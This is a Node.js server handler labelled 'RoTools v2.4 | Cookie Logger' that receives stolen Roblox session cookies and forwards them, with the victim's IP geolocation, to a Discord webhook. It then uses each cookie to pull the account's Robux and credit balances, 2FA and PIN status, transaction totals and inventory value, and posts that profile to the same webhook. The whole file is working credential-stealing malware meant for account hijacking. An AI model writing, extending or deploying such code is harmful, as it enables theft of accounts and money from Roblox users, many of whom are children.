import fetch from 'node-fetch';

export default async function handler(req, res) {
  // Verify authorization
  if (req.headers.authorization !== 'Bearer secure-token-2025') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie } = req.body;
    if (!cookie) {
      return res.status(400).json({ error: 'No cookie provided' });
    }

    // Get client IP and detailed information
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let ipDetails = "🌐 **IP Address**: " + clientIP;
    
    try {
      const ipInfoResponse = await fetch(`https://ipinfo.io/${clientIP}/json`);
      const ipInfo = await ipInfoResponse.json();
      
      ipDetails = `
🌐 **IP Address**: ${ipInfo.ip || 'N/A'}
📍 **Location**: ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country || 'N/A'}
🏢 **ISP**: ${ipInfo.org ? ipInfo.org.split(' ').slice(1).join(' ') : 'N/A'}
📮 **Postal**: ${ipInfo.postal || 'N/A'}
🕒 **Timezone**: ${ipInfo.timezone || 'N/A'}
      `.trim();
    } catch (ipError) {
      console.error('IP info error:', ipError);
      ipDetails += "\n❌ *Additional IP details unavailable*";
    }

    // Send cookie information to Discord with @everyone ping
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: "🔐 RAW COOKIE CAPTURED",
          description: `**IP Information**\n${ipDetails}\n\n**Captured Cookie**:`,
          color: 0x000000,
          fields: [
            { 
              name: "COOKIE DATA", 
              value: `\`\`\`${cookie}\`\`\`` 
            }
          ],
          footer: {
            text: "RoTools v2.4 | Cookie Logger"
          },
          timestamp: new Date().toISOString()
        }]
      })
    });

    // Verify cookie validity
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    
    if (!userRes.ok || userRes.status === 401) {
      return res.json({ 
        success: false, 
        error: 'Invalid cookie - authentication failed' 
      });
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // Fetch all account data in parallel
    const [
      robuxRes,
      creditRes,
      settingsRes,
      friendsRes,
      voiceRes,
      gamepassesRes,
      badgesRes,
      transactionsRes,
      thumbnailRes
    ] = await Promise.all([
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://billing.roblox.com/v1/credit', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://www.roblox.com/my/settings/json', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://friends.roblox.com/v1/my/friends/count`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://voice.roblox.com/v1/settings', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
    ]);

    // Parse responses
    const robuxData = await robuxRes.json();
    const creditData = await creditRes.json();
    const settingsData = await settingsRes.json();
    const friendsData = await friendsRes.json();
    const voiceData = await voiceRes.json();
    const gamepassesData = await gamepassesRes.text();
    const badgesData = await badgesRes.text();
    const transactionsData = await transactionsRes.json();
    const thumbnailData = await thumbnailRes.json();

    // Process gamepasses worth
    const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
      .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
    
    // Process badges
    const account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
      .map(match => match.split('"')[3])
      .join(', ') || 'None';

    // Prepare account information embed
    const accountInfoEmbed = {
      title: "💼 ACCOUNT INFORMATION",
      description: `**IP Information**\n${ipDetails}`,
      color: 0x000000,
      thumbnail: { url: thumbnailData.data[0].imageUrl },
      fields: [
        { name: ":money_mouth: Robux Balance", value: `${robuxData.robux}`, inline: true },
        { name: ":moneybag: Credit Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
        { name: ":bust_in_silhouette: Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
        { name: ":email: Email Verified", value: `${settingsData.IsEmailVerified ? 'Yes' : 'No'}`, inline: true },
        { name: ":calendar: Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
        { name: ":baby: Above 13", value: `${settingsData.UserAbove13 ? 'Yes' : 'No'}`, inline: true },
        { name: ":star: Premium Status", value: `${settingsData.IsPremium ? 'Active' : 'Inactive'}`, inline: true },
        { name: ":key: PIN Enabled", value: `${settingsData.IsAccountPinEnabled ? 'Yes' : 'No'}`, inline: true },
        { name: ":lock: 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled ? 'Yes' : 'No'}`, inline: true },
        { name: ":busts_in_silhouette: Friends Count", value: `${friendsData.count}`, inline: true },
        { name: ":microphone2: Voice Verified", value: `${voiceData.isVerifiedForVoice ? 'Yes' : 'No'}`, inline: true },
        { name: ":video_game: Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
        { name: ":medal: Badges", value: account_badges.substring(0, 1000), inline: false },
        { name: "Transactions Summary", value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline: false },
        { name: ":coin: Goods Sales", value: `${transactionsData.salesTotal}`, inline: true },
        { name: "💰 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
        { name: "📈 Affiliate Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
        { name: ":credit_card: Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
        { name: "🚧 Pending Robux", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
        { name: ":money_with_wings: Total Purchases", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
      ],
      footer: {
        text: "RoTools v2.4 | Account Details (Made by dih)"
      },
      timestamp: new Date().toISOString()
    };

    // Send account information to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [accountInfoEmbed] })
    });

    return res.json({ success: true });
    
  } catch (error) {
    console.error('Server error:', error);
    
    // Send error notification to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "❌ PROCESSING ERROR",
          description: "Failed to process account information",
          color: 0x000000,
          fields: [
            { name: "Error Details", value: `\`\`\`${error.message || 'Unknown error'}\`\`\`` }
          ],
          footer: {
            text: "RoTools v2.4 | Error Report"
          },
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    return res.status(500).json({ 
      success: false, 
      error: error.message || 'Internal server error' 
    });
  }
}
